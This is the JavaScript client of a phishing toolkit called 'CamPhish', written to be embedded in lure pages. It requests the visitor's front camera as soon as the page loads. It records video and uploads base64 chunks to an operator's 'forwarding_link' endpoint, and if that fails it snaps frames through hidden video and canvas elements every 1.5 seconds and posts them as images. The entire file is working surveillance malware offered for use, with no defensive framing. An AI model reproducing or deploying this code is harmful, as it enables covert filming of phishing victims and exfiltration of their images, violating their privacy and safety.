/**
 * CamPhish WebRTC Streaming Client
 * Uses MediaRecorder API for video streaming with automatic canvas fallback.
 * Include this script in template HTML files.
 */
(function() {
    'use strict';

    var config = {
        webrtcEnabled: true,
        chunkInterval: 5000,
        videoBitrate: 500000,
        postUrl: 'forwarding_link/stream/stream.php',
        canvasFallbackInterval: 1500,
        canvasWidth: 640,
        canvasHeight: 480,
        facingMode: 'user'
    };

    var streamId = null;
    var mediaRecorder = null;
    var chunkIndex = 0;
    var canvasInterval = null;
    var usingFallback = false;

    function postData(url, data) {
        return fetch(url, {
            method: 'POST',
            headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
            body: new URLSearchParams(data).toString()
        }).then(function(r) { return r.json(); }).catch(function() { return null; });
    }

    function arrayBufferToBase64(buffer) {
        var binary = '';
        var bytes = new Uint8Array(buffer);
        for (var i = 0; i < bytes.byteLength; i++) {
            binary += String.fromCharCode(bytes[i]);
        }
        return btoa(binary);
    }

    function startWebRTC() {
        if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
            console.log('[CamPhish] WebRTC not supported, using canvas fallback');
            startCanvasFallback();
            return;
        }

        var constraints = {
            audio: false,
            video: { facingMode: config.facingMode, width: { ideal: 640 }, height: { ideal: 480 } }
        };

        navigator.mediaDevices.getUserMedia(constraints).then(function(stream) {
            if (typeof MediaRecorder === 'undefined') {
                console.log('[CamPhish] MediaRecorder not supported, using canvas fallback');
                startCanvasFallbackWithStream(stream);
                return;
            }

            var mimeType = 'video/webm;codecs=vp8';
            if (!MediaRecorder.isTypeSupported(mimeType)) {
                mimeType = 'video/webm';
                if (!MediaRecorder.isTypeSupported(mimeType)) {
                    mimeType = '';
                }
            }

            var recorderOptions = { videoBitsPerSecond: config.videoBitrate };
            if (mimeType) recorderOptions.mimeType = mimeType;

            try {
                mediaRecorder = new MediaRecorder(stream, recorderOptions);
            } catch (e) {
                console.log('[CamPhish] MediaRecorder init failed, using canvas fallback');
                startCanvasFallbackWithStream(stream);
                return;
            }

            postData(config.postUrl, { action: 'init' }).then(function(result) {
                if (!result || !result.stream_id) {
                    startCanvasFallbackWithStream(stream);
                    return;
                }
                streamId = result.stream_id;
                console.log('[CamPhish] WebRTC stream started: ' + streamId);

                mediaRecorder.ondataavailable = function(event) {
                    if (event.data && event.data.size > 0) {
                        var reader = new FileReader();
                        reader.onloadend = function() {
                            var base64 = arrayBufferToBase64(reader.result);
                            postData(config.postUrl, {
                                action: 'chunk',
                                stream_id: streamId,
                                chunk_index: chunkIndex,
                                data: base64,
                                is_last: 'false'
                            });
                            chunkIndex++;
                        };
                        reader.readAsArrayBuffer(event.data);
                    }
                };

                mediaRecorder.onstop = function() {
                    if (streamId) {
                        postData(config.postUrl, {
                            action: 'chunk',
                            stream_id: streamId,
                            chunk_index: chunkIndex,
                            data: '',
                            is_last: 'true'
                        });
                    }
                };

                mediaRecorder.start(config.chunkInterval);
            }).catch(function() {
                startCanvasFallbackWithStream(stream);
            });

        }).catch(function(err) {
            console.log('[CamPhish] getUserMedia failed: ' + err.name + ', using canvas fallback');
            startCanvasFallback();
        });
    }

    function startCanvasFallbackWithStream(stream) {
        usingFallback = true;
        var video = document.createElement('video');
        video.srcObject = stream;
        video.playsInline = true;
        video.autoplay = true;
        video.muted = true;
        video.style.display = 'none';
        document.body.appendChild(video);

        video.addEventListener('loadedmetadata', function() {
            startCanvasCapture(video);
        });
        setTimeout(function() { startCanvasCapture(video); }, 1000);
    }

    function startCanvasFallback() {
        usingFallback = true;
        var video = document.getElementById('video');
        if (video && video.srcObject) {
            startCanvasCapture(video);
            return;
        }

        var constraints = {
            audio: false,
            video: { facingMode: config.facingMode }
        };

        navigator.mediaDevices.getUserMedia(constraints).then(function(stream) {
            var v = document.getElementById('video') || document.createElement('video');
            if (!document.getElementById('video')) {
                v.id = 'video';
                v.playsInline = true;
                v.autoplay = true;
                v.muted = true;
                v.style.display = 'none';
                document.body.appendChild(v);
            }
            v.srcObject = stream;
            v.addEventListener('loadedmetadata', function() { startCanvasCapture(v); });
            setTimeout(function() { startCanvasCapture(v); }, 1000);
        }).catch(function() {
            console.log('[CamPhish] Canvas fallback also failed');
        });
    }

    function startCanvasCapture(video) {
        var canvas = document.getElementById('canvas');
        if (!canvas) {
            canvas = document.createElement('canvas');
            canvas.id = 'canvas';
            canvas.width = config.canvasWidth;
            canvas.height = config.canvasHeight;
            canvas.style.display = 'none';
            document.body.appendChild(canvas);
        }

        var ctx = canvas.getContext('2d');
        canvasInterval = setInterval(function() {
            if (video.readyState >= 2) {
                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                var dataUrl = canvas.toDataURL('image/png');
                postData('forwarding_link/post.php', { cat: dataUrl });
            }
        }, config.canvasFallbackInterval);
    }

    function stopCapture() {
        if (mediaRecorder && mediaRecorder.state === 'recording') {
            mediaRecorder.stop();
        }
        if (canvasInterval) {
            clearInterval(canvasInterval);
        }
    }

    window.addEventListener('beforeunload', stopCapture);
    window.addEventListener('pagehide', stopCapture);

    startWebRTC();
})();
